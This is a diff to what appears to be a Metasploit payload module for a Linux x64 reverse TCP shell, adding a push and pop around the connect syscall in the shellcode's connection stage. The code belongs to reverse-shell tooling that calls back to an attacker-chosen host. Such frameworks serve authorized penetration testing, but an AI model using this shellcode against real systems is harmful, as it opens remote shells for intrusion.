@@ -125,12 +125,14 @@ module Payload::Linux::ReverseTcp_x64
       connect:
         mov    rcx, 0x#{encoded_host}#{encoded_port}
         push   rcx
+        push   rcx
         mov    rsi, rsp
         push   0x10
         pop    rdx
         push   0x2a
         pop    rax
         syscall ; connect(3, {sa_family=AF_INET, LPORT, LHOST, 16)
+        pop    rcx
         pop    rcx
         test   rax, rax
         jns    recv
